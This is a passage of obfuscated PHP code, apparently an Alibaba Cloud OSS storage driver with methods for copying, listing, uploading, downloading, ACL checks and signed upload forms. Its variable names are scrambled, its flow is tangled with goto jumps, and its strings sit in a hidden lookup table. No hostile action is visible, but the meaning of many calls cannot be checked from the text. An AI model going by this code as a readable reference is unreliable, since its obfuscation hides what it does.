array($aã«½«„ˆù[38] => $Dš ¡§éêõ, $aã«½«„ˆù[87] => $d“²õ›»“->getSize(), $aã«½«„ˆù[200] => strtotime($d“²õ›»“->getLastModified())); } $DÊÖ„‰Üƒ°[] = $Dš ¡§éêõ; } foreach ($e¦‰ĞàÛÏ as $a¯¯Ü¹ÜÅ) { $C¨ì‹÷­óñ[] = $a¯¯Ü¹ÜÅ->getPrefix(); } if ($A³‘ĞÁíè === $aã«½«„ˆù[43]) { break; } } return array($aã«½«„ˆù[84] => $C¨ì‹÷­óñ, $aã«½«„ˆù[83] => $DÊÖ„‰Üƒ°); goto cÑ–Ù•ƒíÀ; cÑ–Ù•ƒíÀ: } public function copyFile($Dí‹² Ï•Ê, $EÍóÏ»Õƒ°) { $DçÇ…á–Òõ = $this->size($Dí‹² Ï•Ê); if ($DçÇ…á–Òõ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Dí‹² Ï•Ê, $this->bucket, $this->pathEncode($EÍóÏ»Õƒ°)); } catch (OSS\Core\OssException $F‰êö­Ëà) { return !1; } return $this->getPathOuter($EÍóÏ»Õƒ°); } $FèÃ£İÂÜñ = $this->multiCopyObject($Dí‹² Ï•Ê, $EÍóÏ»Õƒ°, $DçÇ…á–Òõ); return $FèÃ£İÂÜñ ? $this->getPathOuter($EÍóÏ»Õƒ°) : !1; } private function multiCopyObject($aˆ£÷ƒßéÀ, $cÕä§Ã®Á©, $CˆŞÄá¨·) { $DÏ£¶»àÏ =& $_SERVER[çŞáÓæÚô‚Ô‡]; try { goto bŞÜİÁ‰¼ò; fÂ”îíæË: $b‘ åï…Äœ = 1024 * 1024 * 10; $aõÄ­ÏÙ†§ = $this->client->generateMultiuploadParts($CˆŞÄá¨·, $b‘ åï…Äœ); foreach ($aõÄ­ÏÙ†§ as $FÄ¥ÛîòšÓ => $cµ¼ŞØ„ó¥) { $e˜µ¨ŠŞ† = $C³™È¤ø¤ + (int) $cµ¼ŞØ„ó¥[$DÏ£¶»àÏ[1192]]; $dÖŒŒÁŠã† = (int) $cµ¼ŞØ„ó¥[$DÏ£¶»àÏ[334]] + $e˜µ¨ŠŞ† - 1; $EêÌ¹›ê¿ = array($DÏ£¶»àÏ[1193] => $e˜µ¨ŠŞ†, $DÏ£¶»àÏ[1194] => $dÖŒŒÁŠã†); $EÖ¼Æ»ª›[] = $this->client->uploadPartCopy($this->bucket, $aˆ£÷ƒßéÀ, $this->bucket, $this->pathEncode($cÕä§Ã®Á©), $b¬Ğˆ„Ù¡è, $d…Ş¯æÇºˆ, $EêÌ¹›ê¿); $b¬Ğˆ„Ù¡è = $b¬Ğˆ„Ù¡è + 1; } goto eƒÔ¡¯ğ˜; eƒÔ¡¯ğ˜: $EÄèä¾ = array(); foreach ($EÖ¼Æ»ª› as $FÄ¥ÛîòšÓ => $d×ˆö“¥¥Ğ) { $EÄèä¾[] = array($DÏ£¶»àÏ[1195] => $FÄ¥ÛîòšÓ + 1, $DÏ£¶»àÏ[1196] => $d×ˆö“¥¥Ğ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($cÕä§Ã®Á©), $d…Ş¯æÇºˆ, $EÄèä¾); goto e°™šõö‘; bŞÜİÁ‰¼ò: $FøğÉ‹¿ÒŒ = array(); if ($EÚÈ¹â‚Ü± = $this->hashMd5($aˆ£÷ƒßéÀ)) { $FøğÉ‹¿ÒŒ = array(OSS\OssClient::OSS_HEADERS => array($DÏ£¶»àÏ[1191] => $EÚÈ¹â‚Ü±)); } $d…Ş¯æÇºˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cÕä§Ã®Á©), $FøğÉ‹¿ÒŒ); goto dèÍöİ‚¤; dèÍöİ‚¤: $b¬Ğˆ„Ù¡è = 1; $C³™È¤ø¤ = 0; $EÖ¼Æ»ª› = array(); goto fÂ”îíæË; e°™šõö‘: } catch (OSS\Core\OssException $f©´ ˜™æ) { return !1; } return !0; } public function moveFile($C¢¤ÙÖÑïö, $FËå‰¢·Õ’) { if ($this->copyFile($C¢¤ÙÖÑïö, $FËå‰¢·Õ’)) { $this->remove($C¢¤ÙÖÑïö); return $this->getPathOuter($FËå‰¢·Õ’); } return !1; } public function delFile($aº„¥óĞÔ¿) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aº„¥óĞÔ¿)); } catch (OSS\Core\OssException $câ‡ÙÂ«‚ò) { return !1; } return !0; } public function delFolder($B—±Ö„±ò) { $F‚”àÑñ¢˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B‡£Üòéê¯ = $this->fileList($B—±Ö„±ò); if (!empty($B—±Ö„±ò) && !in_array(trim($B—±Ö„±ò, $F‚”àÑñ¢˜[18]) . $F‚”àÑñ¢˜[18], $B‡£Üòéê¯[$F‚”àÑñ¢˜[83]])) { $B‡£Üòéê¯[$F‚”àÑñ¢˜[83]][] = trim($B—±Ö„±ò, $F‚”àÑñ¢˜[18]) . $F‚”àÑñ¢˜[18]; } foreach (array_chunk($B‡£Üòéê¯[$F‚”àÑñ¢˜[83]], 1000) as $e±—ƒ·‚§) { try { $this->client->deleteObjects($this->bucket, $e±—ƒ·‚§); } catch (OSS\Core\OssException $dƒïéóÈ‰‘) { continue; } } return !0; } public function rename($C×š™ÉÆ¤£, $fÁê©Ÿ˜Œ) { return $this->renameObject($C×š™ÉÆ¤£, $fÁê©Ÿ˜Œ); } private function fileInfo($bˆ¾®—‘ùÜ, $E›œ¶é‚…í = array()) { goto fÖ°¾˜èß; fñ¤ÕÖÜ·: return $EÖ³Î Ğİî; goto fñ™ô¤‚Ê†; bÚÇÔèëÆ: if (isset($E›œ¶é‚…í[$Aß‰“¬ŞÍ[87]])) { $EÖ³Î Ğİî[$Aß‰“¬ŞÍ[87]] = $E›œ¶é‚…í[$Aß‰“¬ŞÍ[87]]; } if (isset($E›œ¶é‚…í[$Aß‰“¬ŞÍ[117]])) { $EÖ³Î Ğİî[$Aß‰“¬ŞÍ[117]] = $E›œ¶é‚…í[$Aß‰“¬ŞÍ[117]]; } if (isset($E›œ¶é‚…í[$Aß‰“¬ŞÍ[200]]) && !trim($EÖ³Î Ğİî[$Aß‰“¬ŞÍ[117]])) { $EÖ³Î Ğİî[$Aß‰“¬ŞÍ[117]] = $E›œ¶é‚…í[$Aß‰“¬ŞÍ[200]]; } goto fñ¤ÕÖÜ·; fÖ°¾˜èß: $Aß‰“¬ŞÍ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÖ³Î Ğİî = array($Aß‰“¬ŞÍ[38] => $this->pathThis($bˆ¾®—‘ùÜ), $Aß‰“¬ŞÍ[85] => $this->getPathOuter($bˆ¾®—‘ùÜ), $Aß‰“¬ŞÍ[39] => $Aß‰“¬ŞÍ[177], $Aß‰“¬ŞÍ[197] => 0, $Aß‰“¬ŞÍ[117] => 0, $Aß‰“¬ŞÍ[87] => 0, $Aß‰“¬ŞÍ[170] => $this->ext($bˆ¾®—‘ùÜ), $Aß‰“¬ŞÍ[198] => !0, $Aß‰“¬ŞÍ[199] => !0); if (empty($E›œ¶é‚…í)) { $cŒ¥…Œœ× = $this->objectMeta($bˆ¾®—‘ùÜ); if (!$cŒ¥…Œœ×) { return $EÖ³Î Ğİî; } $E›œ¶é‚…í = array($Aß‰“¬ŞÍ[117] => strtotime($cŒ¥…Œœ×[$Aß‰“¬ŞÍ[1197]]), $Aß‰“¬ŞÍ[87] => $cŒ¥…Œœ×[$Aß‰“¬ŞÍ[1198]] + 0); } goto bÚÇÔèëÆ; fñ™ô¤‚Ê†: } private function folderInfo($aéÛ½·Áİˆ, $f¸ìˆˆ—‘ = array()) { $b½âˆÈ”Ù¡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dƒ§‹›¹¯† = array($b½âˆÈ”Ù¡[38] => $this->pathThis($aéÛ½·Áİˆ), $b½âˆÈ”Ù¡[85] => $this->getPathOuter($b½âˆÈ”Ù¡[18] . $aéÛ½·Áİˆ), $b½âˆÈ”Ù¡[39] => $b½âˆÈ”Ù¡[86], $b½âˆÈ”Ù¡[197] => 0, $b½âˆÈ”Ù¡[117] => 0, $b½âˆÈ”Ù¡[198] => !0, $b½âˆÈ”Ù¡[199] => !0); if (empty($f¸ìˆˆ—‘)) { $aéÛ½·Áİˆ = rtrim($aéÛ½·Áİˆ, $b½âˆÈ”Ù¡[18]) . $b½âˆÈ”Ù¡[18]; $bä‡ƒÏ•¥ = $this->objectMeta($aéÛ½·Áİˆ); if (!$bä‡ƒÏ•¥) { return $dƒ§‹›¹¯†; } $f¸ìˆˆ—‘ = array($b½âˆÈ”Ù¡[197] => $bä‡ƒÏ•¥[$b½âˆÈ”Ù¡[1199]][$b½âˆÈ”Ù¡[1200]], $b½âˆÈ”Ù¡[117] => strtotime($bä‡ƒÏ•¥[$b½âˆÈ”Ù¡[1197]])); } if (isset($f¸ìˆˆ—‘[$b½âˆÈ”Ù¡[117]])) { $dƒ§‹›¹¯†[$b½âˆÈ”Ù¡[117]] = $f¸ìˆˆ—‘[$b½âˆÈ”Ù¡[117]]; } if (isset($f¸ìˆˆ—‘[$b½âˆÈ”Ù¡[197]])) { $dƒ§‹›¹¯†[$b½âˆÈ”Ù¡[197]] = $f¸ìˆˆ—‘[$b½âˆÈ”Ù¡[197]]; } return $dƒ§‹›¹¯†; } public function listPath($a§ÆÈ¿…Ü, $Eô„ˆƒ¸„ = false) { $A¸õ³›™‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aìæ…ô‹èš = $this->fileList($a§ÆÈ¿…Ü, $A¸õ³›™‘[18], !0); foreach ($Aìæ…ô‹èš[$A¸õ³›™‘[84]] as $cäƒ…®î°  => $Eìî¢Ü¨İ§) { $Aìæ…ô‹èš[$A¸õ³›™‘[84]][$cäƒ…®î° ] = $this->folderInfo($Eìî¢Ü¨İ§, $Eìî¢Ü¨İ§); } foreach ($Aìæ…ô‹èš[$A¸õ³›™‘[83]] as $cäƒ…®î°  => $Eìî¢Ü¨İ§) { $Aìæ…ô‹èš[$A¸õ³›™‘[83]][$cäƒ…®î° ] = $this->fileInfo($Eìî¢Ü¨İ§[$A¸õ³›™‘[38]], $Eìî¢Ü¨İ§); } return $Aìæ…ô‹èš; } public function has($Eè¤œÇ®ò, $Eô‹¯è¾Ğ© = false, $cšÎÖéÀì¶ = true) { goto B„¡ìÆïö; B„¡ìÆïö: $F‹ãÄñÅƒˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eè¤œÇ®ò = trim($Eè¤œÇ®ò, $F‹ãÄñÅƒˆ[18]); $EïÉÓôÛ¡† = empty($Eè¤œÇ®ò) ? $F‹ãÄñÅƒˆ[43] : $Eè¤œÇ®ò . $F‹ãÄñÅƒˆ[18]; goto F‹·„ÛÛÌ±; eÄæ‰‡§Ù: $aŸ‡Æˆ”ó = 0; while (!0) { $bŠ«ºâÇ‰¤ = array($F‹ãÄñÅƒˆ[1188] => $F‹ãÄñÅƒˆ[18], $F‹ãÄñÅƒˆ[196] => $EïÉÓôÛ¡†, $F‹ãÄñÅƒˆ[1189] => $Cî¬ªĞí½, $F‹ãÄñÅƒˆ[1190] => $C³¯ä´óŠ½); try { $bÉÕ×Ú–÷ = $this->client->listObjects($this->bucket, $bŠ«ºâÇ‰¤); } catch (OSS\Core\OssException $EËœ¾ÃŠ÷) { break; } $C³¯ä´óŠ½ = $bÉÕ×Ú–÷->getNextMarker(); $f¥ò²å¶‰À = $bÉÕ×Ú–÷->getObjectList(); $BÎùëªŒÑ = $bÉÕ×Ú–÷->getPrefixList(); if ($Eô‹¯è¾Ğ©) { if (count($f¥ò²å¶‰À) > 1 || count($f¥ò²å¶‰À) == 1 && $f¥ò²å¶‰À[0]->getKey() != $EïÉÓôÛ¡†) { $f¶¼À¦ÚÓ += count($f¥ò²å¶‰À) - 1; } if (!empty($BÎùëªŒÑ)) { $aŸ‡Æˆ”ó += count($BÎùëªŒÑ); } if ($C³¯ä´óŠ½ === $F‹ãÄñÅƒˆ[43]) { break; } continue; } if ($cšÎÖéÀì¶) { if (!empty($f¥ò²å¶‰À)) { if (count($f¥ò²å¶‰À) > 1 || $f¥ò²å¶‰À[0]->getKey() != $EïÉÓôÛ¡†) { return !0; } } } else { if (!empty($BÎùëªŒÑ)) { return !0; } } if ($C³¯ä´óŠ½ === $F‹ãÄñÅƒˆ[43]) { break; } } if ($Eô‹¯è¾Ğ©) { return array($F‹ãÄñÅƒˆ[201] => $f¶¼À¦ÚÓ, $F‹ãÄñÅƒˆ[202] => $aŸ‡Æˆ”ó); } goto FÖ³¼×¸ “; FÖ³¼×¸ “: return !1; goto B“ò’äß³“; F‹·„ÛÛÌ±: $C³¯ä´óŠ½ = $F‹ãÄñÅƒˆ[43]; $Cî¬ªĞí½ = 500; $f¶¼À¦ÚÓ = 0; goto eÄæ‰‡§Ù; B“ò’äß³“: } public function listAll($CÓòšâ‰œÁ) { $f˜ñƒÜöô¤ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dŠˆàĞÚÂ’ = $this->fileList($CÓòšâ‰œÁ, $f˜ñƒÜöô¤[43], !0); $eº™Ö¢§… = array(); foreach ($dŠˆàĞÚÂ’[$f˜ñƒÜöô¤[83]] as $B¹è¾çÖÓ) { $eº™Ö¢§…[$B¹è¾çÖÓ[$f˜ñƒÜöô¤[38]]] = $B¹è¾çÖÓ[$f˜ñƒÜöô¤[87]]; } return $this->listAllFiles($CÓòšâ‰œÁ, array_keys($eº™Ö¢§…), $eº™Ö¢§…); } public function canRead($Aê¼´®àÙ¿) { $dÛô†¹É è =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D‘ø¦Ÿ¨ÀŸ = $this->pathAcl($Aê¼´®àÙ¿); return $D‘ø¦Ÿ¨ÀŸ == $dÛô†¹É è[1201] || $D‘ø¦Ÿ¨ÀŸ == $dÛô†¹É è[502] ? !0 : !1; } public function canWrite($DŸÄ³äïÑ) { $DÀªã³Ÿ‚Ü = $this->pathAcl($DŸÄ³äïÑ); return $DÀªã³Ÿ‚Ü == $_SERVER[çŞáÓæÚô‚Ô‡][502] ? !0 : !1; } public function pathAcl($Eø”ğîì…) { goto bŠ‹İóë’¥; bŠ‹İóë’¥: $eîáåÛÕ×ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $cÚ¦›±ñÑ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Eø”ğîì…)); } catch (OSS\Core\OssException $aëâ Œ„ñ³) { return !1; } goto e±Üè°á·ë; e±Üè°á·ë: $Bòó›ğ´® = $cÚ¦›±ñÑ == $eîáåÛÕ×ß[44] ? $this->bucketAcl : $cÚ¦›±ñÑ; if ($Bòó›ğ´® == $eîáåÛÕ×ß[1202]) { return $eîáåÛÕ×ß[1201]; } if ($Bòó›ğ´® == $eîáåÛÕ×ß[1203]) { return $eîáåÛÕ×ß[502]; } goto a¨¯±¾£Õµ; a¨¯±¾£Õµ: return $Bòó›ğ´®; goto fÚ‹º÷ƒæ’; fÚ‹º÷ƒæ’: } private function chmodPath($BÊÎù›ÍÍ, $F©²¢¾ÑÖ„ = '') { $bêÍĞ¥œ× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bİµª™ ²¤ = empty($F©²¢¾ÑÖ„) ? $bêÍĞ¥œ×[1203] : $F©²¢¾ÑÖ„; $e¥Ë¶˜èÛ = array($bêÍĞ¥œ×[44], $bêÍĞ¥œ×[195], $bêÍĞ¥œ×[1202], $bêÍĞ¥œ×[1203]); if (!in_array($bİµª™ ²¤, $e¥Ë¶˜èÛ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($BÊÎù›ÍÍ), $bİµª™ ²¤); } catch (OSS\Core\OssException $Fñë‹•—‡Ö) { return !1; } return !0; } public function getContent($Cêğî¨«ö…) { return $this->fileSubstr($Cêğî¨«ö…, -1); } public function setContent($eÏ„»  «é, $Dİ£äÀ»®¶ = '') { $cÁàÁŸÖˆ¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; try { $FáÍ‘¾‰¢ = $this->trafficLimit($cÁàÁŸÖˆ¢[1204]); $Cèæª’ÔÜ = $this->client->putObject($this->bucket, $this->pathEncode($eÏ„»  «é), $Dİ£äÀ»®¶, $FáÍ‘¾‰¢); } catch (OSS\Core\OssException $bÄ§‚ë¶ğ) { return !1; } $CÂæÜÜâ = array($cÁàÁŸÖˆ¢[1191] => trim($Cèæª’ÔÜ[$cÁàÁŸÖˆ¢[1205]], $cÁàÁŸÖˆ¢[123]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eÏ„»  «é))); $this->updateObjMeta($eÏ„»  «é, $CÂæÜÜâ); return isset($Cèæª’ÔÜ[$cÁàÁŸÖˆ¢[1206]][$cÁàÁŸÖˆ¢[1153]]) ? (int) $Cèæª’ÔÜ[$cÁàÁŸÖˆ¢[1206]][$cÁàÁŸÖˆ¢[1153]] : strlen($Cèæª’ÔÜ); } private function updateObjMeta($bÓŠ¥ÒÂó¼, $Cí°Õ·îà) { $bÓŠ¥ÒÂó¼ = $this->pathEncode($bÓŠ¥ÒÂó¼); try { $e£šè¼ËË¡ = array(OSS\OssClient::OSS_HEADERS => $Cí°Õ·îà); $this->client->copyObject($this->bucket, $bÓŠ¥ÒÂó¼, $this->bucket, $bÓŠ¥ÒÂó¼, $e£šè¼ËË¡); } catch (OSS\Core\OssException $C÷Ö…ã¾÷Ç) { return !1; } return !0; } public function upload($bŞ„”µ®èæ, $F’À„Êï¥‘, $AÙÌ¹±ïÕ = false, $eÀ§Ô¢µ„— = REPEAT_REPLACE) { $b¹ğàİ¢Òô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÊµƒ¾¾á = trim($bŞ„”µ®èæ, $b¹ğàİ¢Òô[18]); $fª¹®‚·‘î = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($b¹ğàİ¢Òô[1191] => @md5_file($F’À„Êï¥‘)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bŞ„”µ®èæ))); $fª¹®‚·‘î = $this->trafficLimit($b¹ğàİ¢Òô[1204], $fª¹®‚·‘î); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($cÊµƒ¾¾á), $F’À„Êï¥‘, $fª¹®‚·‘î); } catch (OSS\Core\OssException $e¾¶ËÎ¾¹) { return !1; } return $this->getPathOuter($bŞ„”µ®èæ); } public function getHost() { $a¨„àßĞ† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÖ¶³ª£‚ = explode($a¨„àßĞ†[181], parent::getHost()); return $eÖ¶³ª£‚[0] . $a¨„àßĞ†[181] . $this->bucket . $a¨„àßĞ†[101] . $eÖ¶³ª£‚[1]; } public function uploadFormData($D•ä‰Õ¥„å, $dùğ÷³©‰ = 3600) { goto F£†Ã¯Ìì–; dõôæÅ“¼î: $Bá¨Ğóµ£ = date($e¡ËÅ§“•Î[1207], time() + $AêğÖòé›); $f¦›ˆì£…İ = new DateTime($Bá¨Ğóµ£); $cŒ†‚í´¡– = $f¦›ˆì£…İ->format(DateTime::ISO8601); goto B¨òË—Çò‚; B¨òË—Çò‚: $Dç¬«µë‚ = strpos($cŒ†‚í´¡–, $e¡ËÅ§“•Î[293]); $cŒ†‚í´¡– = substr($cŒ†‚í´¡–, 0, $Dç¬«µë‚) . $e¡ËÅ§“•Î[1208]; $d‘Î¿ÉŒ = 1048576000 * 5; goto d…³ˆ×‹óª; d…³ˆ×‹óª: $f‘ØÂÙãŠì = $this->pathFather($D•ä‰Õ¥„å); $f¼îÜ£à³¾ = array($e¡ËÅ§“•Î[1109] => $cŒ†‚í´¡–, $e¡ËÅ§“•Î[1110] => array(array($e¡ËÅ§“•Î[1209], 0, $d‘Î¿ÉŒ), array($e¡ËÅ§“•Î[1113], $e¡ËÅ§“•Î[1114], $f‘ØÂÙãŠì))); $AÆ†¹×á–å = base64_encode(json_encode($f¼îÜ£à³¾)); goto cÁ‰³Ò‡‚; F£†Ã¯Ìì–: $e¡ËÅ§“•Î =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!($Ağ¸‹Ğ‡ŠÙ = $this->getHost())) { return !1; } $AêğÖòé› = $dùğ÷³©‰; goto dõôæÅ“¼î; FĞòë”›Ÿ: return $F«Óà›ëÌ×; goto c¨ğå—ôá; cÁ‰³Ò‡‚: $Dòç‘Ë§Ÿ¡ = base64_encode(hash_hmac($e¡ËÅ§“•Î[227], $AÆ†¹×á–å, $this->secret, !0)); $F«Óà›ëÌ× = array($e¡ËÅ§“•Î[1119] => $AÆ†¹×á–å, $e¡ËÅ§“•Î[1210] => $this->accessKey, $e¡ËÅ§“•Î[1115] => $e¡ËÅ§“•Î[1107], $e¡ËÅ§“•Î[1211] => $Dòç‘Ë§Ÿ¡, $e¡ËÅ§“•Î[179] => $Ağ¸‹Ğ‡ŠÙ); $F«Óà›ëÌ× = $this->trafficLimit($e¡ËÅ§“•Î[1204], $F«Óà›ëÌ×); goto FĞòë”›Ÿ; c¨ğå—ôá: } public function multiUploadFormData($EäŒÍÓ„°, $EÁÔÑù¿Ä = 3600) { $AœÙŠ‹Ú²î =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!($FÁÓ«Úµ†ƒ = $this->getHost())) { return !1; } $eŞ¤Ã—„Á„ = $this->trafficLimit($AœÙŠ‹Ú²î[1204]); $båğ‡‰» = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($EäŒÍÓ„°), $eŞ¤Ã—„Á„); return array($AœÙŠ‹Ú²î[219] => $båğ‡‰», $AœÙŠ‹Ú²î[179] => $FÁÓ«Úµ†ƒ . $AœÙŠ‹Ú²î[18] . $this->pathEncode($EäŒÍÓ„°), $AœÙŠ‹Ú²î[220] => gmdate($AœÙŠ‹Ú²î[1212]), $AœÙŠ‹Ú²î[99] => $EäŒÍÓ„°); } public function multiUploadAuthData($f¤Ğ‡®ÜÚ, $eò²ˆ³ù«ö = array()) { goto A‚–Åî’; cå­ÅÙ•î: if (!empty($eò²ˆ³ù«ö[$DÊ¨Â™»°[1214]])) { $Añë¬ª…æ„ = array_merge(array($A»Î‰¶’é[4]), $eò²ˆ³ù«ö[$DÊ¨Â™»°[1214]]); sort($Añë¬ª…æ„); $A»Î‰¶’é[4] = implode($DÊ¨Â™»°[11], $Añë¬ª…æ„); } $E“ˆ×Ùé¢ = implode($DÊ¨Â™»°[11], $A»Î‰¶’é); $cÁ„ÎÃ×£ = base64_encode(hash_hmac($DÊ¨Â™»°[227], $E“ˆ×Ùé¢, $this->secret, !0)); goto B³Ó“øÁ¦‡; C²Á®ŠÌÛ: $f¨­êÅä‚ = $f¤Ğ‡®ÜÚ; if (isset($eò²ˆ³ù«ö[$DÊ¨Â™»°[99]])) { $f¨­êÅä‚ = $eò²ˆ³ù«ö[$DÊ¨Â™»°[99]]; unset($eò²ˆ³ù«ö[$DÊ¨Â™»°[99]]); } if (isset($eò²ˆ³ù«ö[$DÊ¨Â™»°[221]])) { $eò²ˆ³ù«ö[$DÊ¨Â™»°[220]] = $e‡‡ˆñÛÀÁ; return $this->listUploadParts($f¨­êÅä‚, $eò²ˆ³ù«ö); } goto d›½İÏÛË; B³Ó“øÁ¦‡: $F¬®ôÜŒÏ = $DÊ¨Â™»°[1215] . $this->accessKey . $DÊ¨Â™»°[4] . $cÁ„ÎÃ×£; if (strpos($e­Å˜¾Ò¾‚, $DÊ¨Â™»°[223]) === 0) { $F¬®ôÜŒÏ = array($DÊ¨Â™»°[229] => $F¬®ôÜŒÏ, $DÊ¨Â™»°[220] => $e‡‡ˆñÛÀÁ); if ($b–¨ğ‹¹®İ) { $F¬®ôÜŒÏ = array_merge($F¬®ôÜŒÏ, $b–¨ğ‹¹®İ); } } return $F¬®ôÜŒÏ; goto FË’Å‘¤ğ‰; A‚–Åî’: $DÊ¨Â™»° =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e‡‡ˆñÛÀÁ = isset($eò²ˆ³ù«ö[$DÊ¨Â™»°[220]]) ? $eò²ˆ³ù«ö[$DÊ¨Â™»°[220]] : gmdate($DÊ¨Â™»°[1212]); $e­Å˜¾Ò¾‚ = isset($eò²ˆ³ù«ö[$DÊ¨Â™»°[170]]) ? $eò²ˆ³ù«ö[$DÊ¨Â™»°[170]] : $DÊ¨Â™»°[43]; goto C²Á®ŠÌÛ; d›½İÏÛË: $A»Î‰¶’é = array($DÊ¨Â™»°[222], $DÊ¨Â™»°[43], $DÊ¨Â™»°[126], $e‡‡ˆñÛÀÁ, "\170\55\157\163\163\55\144\141\x74\145\x3a{$e‡‡ˆñÛÀÁ}", $DÊ¨Â™»°[18] . $this->bucket . $DÊ¨Â™»°[18] . $f¨­êÅä‚ . $e­Å˜¾Ò¾‚); if (strpos($e­Å˜¾Ò¾‚, $DÊ¨Â™»°[223]) === 0) { $A»Î‰¶’é[0] = $DÊ¨Â™»°[224]; if ($b–¨ğ‹¹®İ = $this->trafficLimit($DÊ¨Â™»°[1204])) { $f¨­êÅä‚ = $DÊ¨Â™»°[1213]; array_splice($A»Î‰¶’é, 5, 0, $f¨­êÅä‚ . $DÊ¨Â™»°[4] . $b–¨ğ‹¹®İ[$f¨­êÅä‚]); } } if (isset($eò²ˆ³ù«ö[$DÊ¨Â™»°[225]]) && $eò²ˆ³ù«ö[$DÊ¨Â™»°[225]] == $DÊ¨Â™»°[226]) { $A»Î‰¶’é[0] = $DÊ¨Â™»°[226]; } goto cå­ÅÙ•î; FË’Å‘¤ğ‰: } public function listUploadParts($FíËŸÌ×¦µ, $Dò»°æÊØˆ) { goto cÇïİÕƒà; cÇïİÕƒà: $CÕ´Ú•· =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fÃÛß‘‹šŞ = parse_url_query($Dò»°æÊØˆ[$CÕ´Ú•·[170]]); $fëŠê£¦êø = $this->client->listParts($this->bucket, $this->pathEncode($FíËŸÌ×¦µ), $fÃÛß‘‹šŞ[$CÕ´Ú•·[219]]); goto eÙ¥§ÌÖ‰•; FËÃÄØÀß: return array($CÕ´Ú•·[229] => $c¢Ìáæğ²ê, $CÕ´Ú•·[220] => $Dò»°æÊØˆ[$CÕ´Ú•·[220]], $CÕ´Ú•·[231] => $b¹Œâˆ×á); goto e÷ èñ»õ¢; eÙ¥§ÌÖ‰•: $BÏæĞ¾‚¡¡ = $fëŠê£¦êø->getListPart(); $b¹Œâˆ×á = array(); foreach ($BÏæĞ¾‚¡¡ as $F«Ç±¾ß—Œ) { $b¹Œâˆ×á[] = array($CÕ´Ú•·[1195] => $F«Ç±¾ß—Œ->getPartNumber(), $CÕ´Ú•·[1196] => trim($F«Ç±¾ß—Œ->getETag(), $CÕ´Ú•·[123])); } goto C¾¸§¾ªİÃ; C¾¸§¾ªİÃ: unset($Dò»°æÊØˆ[$CÕ´Ú•·[221]], $Dò»°æÊØˆ[$CÕ´Ú•·[225]]); $c¢Ìáæğ²ê = $this->multiUploadAuthData($FíËŸÌ×¦µ, $Dò»°æÊØˆ); if (empty($c¢Ìáæğ²ê)) { return !1; } goto FËÃÄØÀß; e÷ èñ»õ¢: } public function download($E»ÃõÊÙ×¹, $D­õ‘÷Âİ“) { if ($this->isFolder($E»ÃõÊÙ×¹)) { return !1; } try { $FŞ‘ÁÑ¢Éİ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $D­õ‘÷Âİ“); $FŞ‘ÁÑ¢Éİ = $this->trafficLimit($_SERVER[çŞáÓæÚô‚Ô‡][115], $FŞ‘ÁÑ¢Éİ); $this->client->getObject($this->bucket, $this->pathEncode($E»ÃõÊÙ×¹), $FŞ‘ÁÑ¢Éİ); } catch (OSS\Core\OssException $DĞœ°‚ÅÜ½) { return !1; } return $D­õ‘÷Âİ“; } public function fileSubstr($eóÎÃØÌ—, $bÁ –ì ğÌ = 0, $C‡§ˆÉ‚Íª = false) { if ($bÁ –ì ğÌ === -1) { $c÷Œø¨ÒÏ = array(); } else { if ($C‡§ˆÉ‚Íª === !1) { $aƒÆ¦®´– = $this->size($eóÎÃØÌ—); } else { $aƒÆ¦®´– = $bÁ –ì ğÌ + $C‡§ˆÉ‚Íª - 1; } $c÷Œø¨ÒÏ = array(OSS\OssClient::OSS_RANGE => "{$bÁ –ì ğÌ}\x2d{$aƒÆ¦®´–}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($eóÎÃØÌ—), $c÷Œø¨ÒÏ); } catch (OSS\Core\OssException $b¯±ª”Û ¶) { think_exception($b¯±ª”Û ¶->getMessage()); return !1; } } private function trafficLimit($d—öØÛÄùŸ, $aîˆ¬·ˆÍ = array()) { goto f·‹‘œ„¤Ä; f·‹‘œ„¤Ä: $cİÄ‡‚æ¢½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($d—öØÛÄùŸ == $cİÄ‡‚æ¢½[1204] && $this->isUploadServer() || $d—öØÛÄùŸ == $cİÄ‡‚æ¢½[115] && $this->isFileOutServer()) { return $aîˆ¬·ˆÍ; } $EÑì†ÓÍ‚ˆ = floatval($GLOBALS[$cİÄ‡‚æ¢½[16]][$cİÄ‡‚æ¢½[94]][$cİÄ‡‚æ¢½[113]][$d—öØÛÄùŸ]) * 1024 * 1024 * 8; goto AÈò’¦„´; AÈò’¦„´: if (!$EÑì†ÓÍ‚ˆ) { return $aîˆ¬·ˆÍ; } $EÑì†ÓÍ‚ˆ = $EÑì†ÓÍ‚ˆ < 819200 ? 819200 : ($EÑì†ÓÍ‚ˆ > 838860800 ? 838860800 : $EÑì†ÓÍ‚ˆ); 